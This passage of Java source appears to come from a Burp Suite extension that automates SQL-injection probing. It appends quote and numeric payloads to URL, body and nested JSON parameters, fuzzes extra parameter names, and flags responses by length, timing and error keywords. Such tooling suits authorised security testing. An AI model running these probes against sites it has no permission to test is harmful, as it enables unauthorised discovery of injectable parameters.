                         type == HttpParameterType.XML || type == HttpParameterType.XML_ATTRIBUTE || 
                         type == HttpParameterType.MULTIPART_ATTRIBUTE) {
                         testableParams.add(para);
                     }
                }
                
                // 7. 参数黑白名单过滤
                List<ParsedHttpParameter> filteredParams = new ArrayList<>();
                if (paramListMode == 1) { // 白名单模式
                    for (ParsedHttpParameter para : testableParams) if (whiteListParams.contains(para.name())) filteredParams.add(para);
                } else if (paramListMode == 2) { // 黑名单模式
                    for (ParsedHttpParameter para : testableParams) if (!blackListParams.contains(para.name())) filteredParams.add(para);
                } else { // 无过滤
                    filteredParams.addAll(testableParams);
                }

                // 如果没参数且没开启FUZZ，跳过
                if (filteredParams.isEmpty() && (enableFuzzParams == 0 || fuzzParamsList.isEmpty())) return;

                count++;
                dataMd5Id = md5Data;

                // 8. 记录日志 (Start)
                LogEntry originalLogEntry = new LogEntry(count, toolFlag, baseRequestResponse, url, "", "", "", md5Data, 0, "start",
                    baseRequestResponse.response() != null ? baseRequestResponse.response().statusCode() : 0);
                log.add(originalLogEntry);
                fireTableRowsInserted(log.size() - 1, log.size() - 1);

                String baseUrl = url.split("\\?")[0];
                originalDataLen = baseRequestResponse.response() != null ? baseRequestResponse.response().body().length() : 0;

                // 9. 遍历参数进行常规测试 (包含 testParameter 内部的逻辑)
                for (ParsedHttpParameter para : filteredParams) {
                    try {
                        // 常规 Payload 测试 (包含 JSON 内部注入)
                        testParameter(request, para, baseUrl, md5Data);
                        
                        // URL-JSON 内部 FUZZ (针对 url={"a":1} 这种参数进行内部插入 key)
                        if (enableFuzzParams == 1 && !fuzzParamsList.isEmpty()) {
                             fuzzUrlJsonParameter(request, para, baseUrl, md5Data);
                        }
                    } catch (Exception e) { e.printStackTrace(); }
                }

                // 10. 额外参数 FUZZ (针对 Request 级别的参数追加，例如 &order=)
                if (enableFuzzParams == 1 && !fuzzParamsList.isEmpty()) {
                    List<String> existingNames = new ArrayList<>();
                    for (ParsedHttpParameter p : paraLists) existingNames.add(p.name());
                    
                    for (String fuzzName : fuzzParamsList) {
                        // 避免重复测试已存在的参数
                        if (!existingNames.contains(fuzzName)) {
                             try { testFuzzParameter(request, fuzzName, baseUrl, md5Data); } catch (Exception e) {}
                        }
                    }
                }

                api.logging().logToOutput("URL测试完成：" + url);
                updateLogStatus(md5Data);
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void updateLogStatus(String md5Data) {
        for (int i = 0; i < log.size(); i++) {
            if (md5Data.equals(log.get(i).dataMd5)) {
                boolean hasAnyError = false;
                boolean hasAnyTimeExceeded = false;
                boolean hasFuzzFound = false; 
                
                synchronized(log2) {
                    for (LogEntry testEntry : log2) {
                        if (testEntry.dataMd5.equals(md5Data)) {
                            if (testEntry.hasError) hasAnyError = true;
                            if (testEntry.change != null && testEntry.change.contains("time >")) hasAnyTimeExceeded = true;
                            // 检查是否包含 FUZZ 标记
                            if (testEntry.parameter != null && testEntry.parameter.contains("[FUZZ]")) hasFuzzFound = true;
                        }
                    }
                }

                if (hasAnyError) log.get(i).setState("end! [err]");
                else if (hasAnyTimeExceeded) log.get(i).setState("end! [time]");
                else if (hasFuzzFound) log.get(i).setState("end! [fuzz]");
                else log.get(i).setState("end!");
                
                fireTableDataChanged();
                break;
            }
        }
    }

    // ====== 辅助方法：判断字符串是否为JSON格式 ======
    private boolean isJson(String s) {
        if (s == null) return false;
        String t = s.trim();
        return (t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"));
    }

    // ====== 修改后：testParameter (修复 Bug 1/2/3 - 支持复杂嵌套JSON) ======
    private void testParameter(HttpRequest originalRequest, ParsedHttpParameter parameter, String baseUrl, String requestMd5Id) {
        try {
            String paramName = parameter.name();
            String originalValue = parameter.value();
            HttpParameterType paramType = parameter.type();

            api.logging().logToOutput("\n测试参数：" + paramName + " (类型：" + paramType + ")");

            boolean isUrlEncodedJson = false;
            String decodedJsonTemplate = originalValue;
            try {
                if (originalValue.contains("%")) {
                    String decoded = URLDecoder.decode(originalValue, StandardCharsets.UTF_8.name());
                    if (isJson(decoded)) {
                        isUrlEncodedJson = true;
                        decodedJsonTemplate = decoded;
                    }
                }
            } catch (Exception e) {}

            if (!isUrlEncodedJson && isJson(originalValue)) {
                isUrlEncodedJson = true;
                decodedJsonTemplate = originalValue;
            }

            List<String> payloads = new ArrayList<>();
            payloads.add("'"); payloads.add("''");
            if (!isUrlEncodedJson && isInt == 1 && originalValue.matches("[0-9]+")) { payloads.add("-1"); payloads.add("-0"); }

            List<String> finalPayloads = new ArrayList<>(payloads);
            if (jTextAreaInt == 1 && !jTextAreaData1.isEmpty()) {
                finalPayloads.clear();
                for (String p : jTextAreaData1.split("\\n")) if (!p.trim().isEmpty()) finalPayloads.add(p.trim());
            }

            int firstLen = 0;

            for (String payload : finalPayloads) {
                if (isUrlEncodedJson) {
                    // JSON 模式：使用深度遍历支持任意嵌套结构
                    JsonUtils jsonUtils = api.utilities().jsonUtils();
                    if (jsonUtils.isValidJson(decodedJsonTemplate)) {
                        // 递归查找所有可能的注入点（包括数组内对象的所有字段）
                        java.util.List<String> allPaths = findAllJsonPaths(decodedJsonTemplate);
                        api.logging().logToOutput("  -> 找到 " + allPaths.size() + " 个JSON注入点");
                        
                        for (String path : allPaths) {
                            // 对每个路径进行注入
                            try {
                                String modifiedJson = injectPayloadToJson(decodedJsonTemplate, path, payload);
                                if (!modifiedJson.equals(decodedJsonTemplate)) {
                                    String finalVal = URLEncoder.encode(modifiedJson, StandardCharsets.UTF_8.name());
                                    String testInfo = payload + " [" + path + "]";
                                    sendTestRequest(originalRequest, paramName, paramType, finalVal, testInfo, baseUrl, firstLen, requestMd5Id);
                                }
                            } catch (Exception e) {
                                api.logging().logToOutput("  -> 路径 " + path + " 注入失败: " + e.getMessage());
                            }
                        }
                    } else {
                        api.logging().logToOutput("  -> 无效的JSON格式");
                    }
                } else {
                    // 普通模式
                    String appendVal = (jTextAreaInt == 1 && diyPayload2 == 1 && !payload.equals("'") && !payload.equals("''")) ? payload : originalValue + payload;
                    sendTestRequest(originalRequest, paramName, paramType, appendVal, payload, baseUrl, firstLen, requestMd5Id);
                }
            }
        } catch (Exception e) { 
            api.logging().logToOutput("testParameter异常: " + e.getMessage());
            e.printStackTrace(); 
        }
    }

    private void sendTestRequest(HttpRequest originalRequest, String paramName, HttpParameterType paramType,
                                 String newValue, String payload, String baseUrl, int firstLen, String requestMd5Id) {
        try {
            HttpRequest testRequest;
            if (paramType == HttpParameterType.JSON) {
                String body = originalRequest.bodyToString();
                String modBody = replaceJsonValue(body, paramName, newValue);
                testRequest = modBody.equals(body) ? 
                    originalRequest.withUpdatedParameters(burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType)) : 
                    originalRequest.withBody(modBody);
            } else {
                testRequest = originalRequest.withUpdatedParameters(burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType));
            }
            
            long start = System.currentTimeMillis();
            HttpRequestResponse resp = api.http().sendRequest(testRequest);
            long time = System.currentTimeMillis() - start;
            int code = resp.response().statusCode();
            int len = resp.response().body().length();
            
            String change = "";
            if (time >= responseTimeThreshold) change = "time > " + (responseTimeThreshold/1000);
            else if (len == 0) change = "无响应";
            else if (payload.equals("'")) {
                firstLen = len;
                if (Math.abs(len - originalDataLen) >= lengthDiffThreshold) change = "diff: " + (len - originalDataLen);
            } else {
                if (Math.abs(len - originalDataLen) >= lengthDiffThreshold) change = "diff: " + (len - originalDataLen);
            }

            boolean hasError = false;
            if (enableCustomError == 1 && resp.response().bodyToString() != null) {
                String bodyLower = resp.response().bodyToString().toLowerCase();
                for (String k : errorKeywordsList) if (bodyLower.contains(k.toLowerCase())) { hasError = true; break; }
            }
            if (hasError) change = "ERR! " + change;

            LogEntry entry = new LogEntry(count, clicksRepeater, resp, baseUrl, paramName, payload, change, requestMd5Id, (int)time, code+"", code);
            entry.hasError = hasError;
            synchronized(log2) { log2.add(entry); }
            
            if (hasError) {
                synchronized(log) {
                    for(LogEntry l : log) if(l.dataMd5.equals(requestMd5Id)) { l.hasAnyError = true; break; }
                }
            }
            
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ====== FUZZ: testFuzzParameter (POST JSON) ======
    private void testFuzzParameter(HttpRequest originalRequest, String paramName, String baseUrl, String requestMd5Id) {
        try {
            HttpParameterType paramType = HttpParameterType.URL;
            if (originalRequest.method().equalsIgnoreCase("POST")) {
                burp.api.montoya.http.message.ContentType ct = originalRequest.contentType();
                if (ct == burp.api.montoya.http.message.ContentType.JSON) paramType = HttpParameterType.JSON;
                else if (ct == burp.api.montoya.http.message.ContentType.URL_ENCODED) paramType = HttpParameterType.BODY;
            }
            
            List<String> payloads = new ArrayList<>();
            payloads.add("'"); payloads.add("''");
            if (jTextAreaInt == 1 && !jTextAreaData1.isEmpty()) {
                 payloads.clear();
                 for(String p : jTextAreaData1.split("\\n")) if(!p.trim().isEmpty()) payloads.add(p.trim());
            }

            for (String payload : payloads) {
                sendFuzzTestRequest(originalRequest, paramName, paramType, payload, payload, baseUrl, 0, requestMd5Id);
            }
        } catch (Exception e) {}
    }

    // ====== 新增：发送FUZZ测试请求 ======
    private void sendFuzzTestRequest(HttpRequest originalRequest, String paramName, HttpParameterType paramType,
                                 String newValue, String payload, String baseUrl, int firstLen, String requestMd5Id) {
        try {
            HttpRequest testRequest;
            if (paramType == HttpParameterType.JSON) {
                String newBody = addJsonParameter(originalRequest.bodyToString(), paramName, newValue);
                testRequest = originalRequest.withBody(newBody);
            } else {
                testRequest = originalRequest.withAddedParameters(burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newValue, paramType));
            }
            
            long start = System.currentTimeMillis();
            HttpRequestResponse resp = api.http().sendRequest(testRequest);
            long time = System.currentTimeMillis() - start;
            int len = resp.response().body().length();
            int code = resp.response().statusCode();
            
            String change = "";
            if (time >= responseTimeThreshold) change = "time > " + (responseTimeThreshold/1000);
            else if (Math.abs(len - originalDataLen) >= lengthDiffThreshold) change = "diff: " + (len - originalDataLen);
            change = "[FUZZ] " + change;
            
            boolean hasError = false;
            if (enableCustomError == 1 && resp.response().bodyToString() != null) {
                String bodyLower = resp.response().bodyToString().toLowerCase();
                for (String k : errorKeywordsList) if (bodyLower.contains(k.toLowerCase())) hasError = true;
            }
            if (hasError) change = "ERR! " + change;

            LogEntry entry = new LogEntry(count, clicksRepeater, resp, baseUrl, paramName + " [FUZZ]", payload, change, requestMd5Id, (int)time, code+"", code);
            entry.hasError = hasError;
            synchronized(log2) { log2.add(entry); }
            
            final String currentSelectedMd5 = dataMd5Id;
            if (currentSelectedMd5 != null && currentSelectedMd5.equals(requestMd5Id)) {
                SwingUtilities.invokeLater(() -> {
                    if (currentSelectedMd5.equals(dataMd5Id)) {
                        synchronized (log2) {
                            log3.clear();
                            for (LogEntry e : log2) if (e.dataMd5.equals(currentSelectedMd5)) log3.add(e);
                        }
                        model.fireTableDataChanged();
                    }
                });
            }
        } catch (Exception e) {}
    }

    // ====== 核心：fuzzUrlJsonParameter (修复 Bug 1: 强制 URL 编码 & 添加日志) ======
    private void fuzzUrlJsonParameter(HttpRequest originalRequest, ParsedHttpParameter targetParam, String baseUrl, String requestMd5Id) {
        try {
            String val = targetParam.value();
            String decodedVal = val;
            boolean isJson = false;
            
            try {
                if (val.contains("%")) decodedVal = URLDecoder.decode(val, StandardCharsets.UTF_8.name());
            } catch(Exception e) {}
            
            if (isJson(decodedVal.trim())) isJson = true;
            else if (isJson(val.trim())) { isJson = true; decodedVal = val; }
            
            if (!isJson) return;

            // 修复点：遍历所有 Payload
            List<String> payloads = new ArrayList<>();
            payloads.add("'");
            payloads.add("''");
            if (jTextAreaInt == 1 && !jTextAreaData1.isEmpty()) {
                 String[] customPayloads = jTextAreaData1.split("\\n");
                 for(String p : customPayloads) if(!p.trim().isEmpty()) payloads.add(p.trim());
            }

            for (String fuzzName : fuzzParamsList) {
                if (decodedVal.contains("\"" + fuzzName + "\"")) continue;

                // 修复点：双重循环遍历
                for (String payload : payloads) {
                    String newJson = addJsonParameter(decodedVal, fuzzName, payload);
                    if (newJson.equals(decodedVal)) continue;
                    
                    String finalVal = URLEncoder.encode(newJson, StandardCharsets.UTF_8.name());
                    sendFuzzJsonInjectRequest(originalRequest, targetParam.name(), targetParam.type(), finalVal, fuzzName, payload, baseUrl, 0, requestMd5Id);
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ====== 辅助方法：发送并记录 JSON Fuzz 日志 (恢复日志功能) ======
    private void sendFuzzJsonInjectRequest(HttpRequest originalRequest, String paramName, HttpParameterType paramType,
                                 String newParamValue, String fuzzKey, String payload, String baseUrl, int firstLen, String requestMd5Id) {
        try {
            HttpRequest testRequest = originalRequest.withUpdatedParameters(
                burp.api.montoya.http.message.params.HttpParameter.parameter(paramName, newParamValue, paramType)
            );

            long start = System.currentTimeMillis();
            HttpRequestResponse resp = api.http().sendRequest(testRequest);
            long time = System.currentTimeMillis() - start;
            int code = resp.response().statusCode();
            int len = resp.response().body().length();
            
            String change = "";
            if (Math.abs(len - originalDataLen) >= lengthDiffThreshold) change = "diff: " + (len - originalDataLen);
            change = "[FUZZ-JSON] " + change;
            
            boolean hasError = false;
            if (enableCustomError == 1 && resp.response().bodyToString() != null) {
                String bodyLower = resp.response().bodyToString().toLowerCase();
                for (String k : errorKeywordsList) if (bodyLower.contains(k.toLowerCase())) hasError = true;
            }
            if (hasError) change = "ERR! " + change;

            LogEntry entry = new LogEntry(count, clicksRepeater, resp, baseUrl, paramName + " [FUZZ-JSON]", payload, change, requestMd5Id, (int)time, code+"", code);
            entry.hasError = hasError;
            synchronized(log2) { log2.add(entry); }
            
            final String currentSelectedMd5 = dataMd5Id;
            if (currentSelectedMd5 != null && currentSelectedMd5.equals(requestMd5Id)) {
                SwingUtilities.invokeLater(() -> {
                    if (currentSelectedMd5.equals(dataMd5Id)) {
                        synchronized (log2) {
                            log3.clear();
                            for (LogEntry e : log2) if (e.dataMd5.equals(currentSelectedMd5)) log3.add(e);
                        }
                        model.fireTableDataChanged();
                    }
                });
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private String addJsonParameter(String jsonBody, String key, String value) {
        if (jsonBody == null) return jsonBody;
        String trimmed = jsonBody.trim();
        boolean isObj = trimmed.startsWith("{") && trimmed.endsWith("}");
        boolean isArr = trimmed.startsWith("[") && trimmed.endsWith("]");
        if (!isObj && !isArr) return jsonBody;

        int lastBrace = trimmed.lastIndexOf('}');
        if (lastBrace == -1) return jsonBody;
        int firstBrace = trimmed.indexOf('{');
        if (firstBrace == -1) return jsonBody;

        StringBuilder sb = new StringBuilder(trimmed);
        String content = trimmed.substring(firstBrace + 1, lastBrace).trim();
        String entry = "\"" + key + "\": \"" + value + "\"";
        
        if (content.isEmpty()) sb.insert(lastBrace, entry);
        else sb.insert(lastBrace, ", " + entry);
        return sb.toString();
    }
    
    // ====== 新增：深度查找所有 JSON 注入点（支持任意嵌套结构） ======
    private java.util.List<String> findAllJsonPaths(String jsonBody) {
        java.util.List<String> paths = new java.util.ArrayList<>();
        try {
            JsonNode rootNode = JsonNode.jsonNode(jsonBody);
            findAllJsonPathsRecursive(rootNode, "", paths);
        } catch (Exception e) {
            api.logging().logToOutput("  -> 查找JSON路径异常: " + e.getMessage());
        }
        return paths;
    }
    
    private void findAllJsonPathsRecursive(JsonNode node, String currentPath, java.util.List<String> paths) {
        try {
            if (node.isObject()) {
                JsonObjectNode objectNode = node.asObject();
                for (String key : objectNode.asMap().keySet()) {
                    String newPath = currentPath.isEmpty() ? key : currentPath + "." + key;
                    JsonNode childNode = objectNode.get(key);
                    if (childNode != null) {
                        findAllJsonPathsRecursive(childNode, newPath, paths);
                    }
                }
            } else if (node.isArray()) {
                JsonArrayNode arrayNode = node.asArray();
                for (int i = 0; i < arrayNode.asList().size(); i++) {
                    String newPath = currentPath + "[" + i + "]";
                    JsonNode childNode = arrayNode.get(i);
                    if (childNode != null) {
                        findAllJsonPathsRecursive(childNode, newPath, paths);
                    }
                }
            } else if (!node.isObject() && !node.isArray()) {
                // 这是一个值节点（字符串、数字、布尔值），添加到路径列表
                if (!currentPath.isEmpty()) {
                    paths.add(currentPath);
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("  -> 递归查找路径异常: " + e.getMessage());
        }
    }
    
    // ====== 新增：在指定 JSON 路径注入 payload ======
    private String injectPayloadToJson(String jsonBody, String path, String payload) {
        try {
            JsonUtils jsonUtils = api.utilities().jsonUtils();
            if (!jsonUtils.isValidJson(jsonBody)) {
                return jsonBody;
            }
            
            // 获取路径节点的当前值
            JsonNode rootNode = JsonNode.jsonNode(jsonBody);
            String[] pathElements = path.split("\\.");
            
            // 逐层遍历路径到目标节点
            JsonNode targetNode = rootNode;
            for (String element : pathElements) {
                if (element.contains("[")) {
                    // 处理数组索引，例如 orderBy[0]
                    String key = element.substring(0, element.indexOf("["));
                    int index = Integer.parseInt(element.substring(element.indexOf("[") + 1, element.indexOf("]")));
                    if (targetNode.isObject()) {
                        targetNode = targetNode.asObject().get(key);
                        if (targetNode != null && targetNode.isArray() && index < targetNode.asArray().asList().size()) {
                            targetNode = targetNode.asArray().get(index);
                        }
                    }
                } else {
                    if (targetNode.isObject()) {
                        targetNode = targetNode.asObject().get(element);
                    }
                }
                if (targetNode == null) {
                    return jsonBody;
                }
            }
            
            // 对目标节点进行注入
            String originalValue;
            if (targetNode.isString()) {
                originalValue = targetNode.asString();
            } else if (targetNode.isNumber()) {
                originalValue = targetNode.asNumber().toString();
            } else if (targetNode.isBoolean()) {
                originalValue = String.valueOf(targetNode.asBoolean());
            } else {
                return jsonBody;
            }
            
            // 使用 Burp API 更新 JSON
            String newValue = originalValue + payload;
            String modifiedJson = jsonUtils.update(jsonBody, path, "\"" + newValue + "\"");
            
            return modifiedJson;
        } catch (Exception e) {
            api.logging().logToOutput("  -> JSON注入异常: " + e.getMessage());
            return jsonBody;
        }
    }
    
    // ... 补充的 UI 辅助方法 ...
    private void fireTableRowsInserted(int firstRow, int lastRow) {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableRowsInserted(firstRow, lastRow);
            }
        });
    }

    private void fireTableDataChanged() {
        SwingUtilities.invokeLater(() -> {
            if (logTable != null && logTable.getModel() instanceof AbstractTableModel) {
                ((AbstractTableModel) logTable.getModel()).fireTableDataChanged();
            }
        });
    }

    private static class LogEntry {
        final int id;
        final int tool;
        final HttpRequestResponse requestResponse;
        final String url;
        final String parameter;
        final String value;
        final String change;
        final String dataMd5;
        final int times;
        final int responseCode;
        final int responseLength;
        String state;
        boolean hasError; 
        boolean hasAnyError; 

        LogEntry(int id, int tool, HttpRequestResponse requestResponse, String url,
                String parameter, String value, String change, String dataMd5,
                int times, String state, int responseCode) {
            this.id = id;
            this.tool = tool;
            this.requestResponse = requestResponse;
            this.url = url;
            this.parameter = parameter;
            this.value = value;
            this.change = change;
            this.dataMd5 = dataMd5;
            this.times = times;
            this.state = state;
            this.responseCode = responseCode;
            this.responseLength = requestResponse != null && requestResponse.response() != null ?
                requestResponse.response().body().length() : 0;
            this.hasError = false;
            this.hasAnyError = false;
        }

        public String setState(String state) {
            this.state = state;
            return this.state;
        }
    }

    private static class RequestMd5 {
        final String md5Data;

        RequestMd5(String md5Data) {
            this.md5Data = md5Data;
        }
    }

    public static String MD5(String key) {
        try {
            byte[] btInput = key.getBytes();
            MessageDigest mdInst = MessageDigest.getInstance("MD5");
            mdInst.update(btInput);
            byte[] md = mdInst.digest();
            int j = md.length;
            char str[] = new char[j * 2];
            int k = 0;
            char hexDigits[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
            for (int i = 0; i < j; i++) {
                byte byte0 = md[i];
                str[k++] = hexDigits[byte0 >>> 4 & 0xf];
                str[k++] = hexDigits[byte0 & 0xf];
            }
            return new String(str);
        } catch (Exception e) { return null; }
    }
    
    private class Table extends JTable {
        public Table(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            if (row >= 0 && row < log.size()) {
                LogEntry logEntry;
                synchronized (log) {
                    if (row >= log.size()) {
                        super.changeSelection(row, col, toggle, extend);
                        return;
                    }
                    logEntry = log.get(row);
                }
                
                dataMd5Id = logEntry.dataMd5;
                selectRow = logEntry.id;

                SwingUtilities.invokeLater(() -> {
                    synchronized (log2) {
                        log3.clear();
                        for (LogEntry entry : log2) {
                            if (entry.dataMd5.equals(dataMd5Id)) {
                                log3.add(entry);
                            }
                        }
                    }
                    model.fireTableDataChanged();
                });

                if (logEntry.requestResponse != null) {
                    SwingUtilities.invokeLater(() -> {
                        requestViewer.setRequest(logEntry.requestResponse.request());
                        responseViewer.setResponse(logEntry.requestResponse.response());
                    });
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    private class LeftTableModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "#";
                case 1: return "来源";
                case 2: return "URL";
                case 3: return "返回包长度";
                case 4: return "状态";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log.size()) return "";
            LogEntry logEntry = log.get(rowIndex);

            switch (columnIndex) {
                case 0:
                    return String.valueOf(logEntry.id);
                case 1:
                    if (logEntry.tool == 4) return "Proxy";
                    else if (logEntry.tool == 16) return "Scanner";
                    else if (logEntry.tool == 32) return "Intruder";
                    else if (logEntry.tool == 64) return "Repeater";
                    else if (logEntry.tool == 1024) return "Menu";
                    else return String.valueOf(logEntry.tool);
                case 2:
                    return logEntry.url;
                case 3:
                    return String.valueOf(logEntry.responseLength);
                case 4:
                    return logEntry.state;
                default:
                    return "";
            }
        }
    }

    private class PayloadTable extends JTable {
        public PayloadTable(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            if (row < log3.size()) {
                LogEntry logEntry = log3.get(row);
                if (logEntry.requestResponse != null) {
                    requestViewer.setRequest(logEntry.requestResponse.request());
                    responseViewer.setResponse(logEntry.requestResponse.response());
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    private class MyModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log3.size();
        }

        @Override
        public int getColumnCount() {
            return 6;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "参数";
                case 1: return "payload";
                case 2: return "返回包长度";
                case 3: return "变化";
                case 4: return "用时";
                case 5: return "响应码";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log3.size()) return "";
            LogEntry logEntry = log3.get(rowIndex);
            switch (columnIndex) {
                case 0: return logEntry.parameter;
                case 1: return logEntry.value;
                case 2: return logEntry.responseLength;
                case 3: return logEntry.change;
                case 4: return logEntry.times;
                case 5: return logEntry.responseCode;
                default: return "";
            }
        }
    }
}
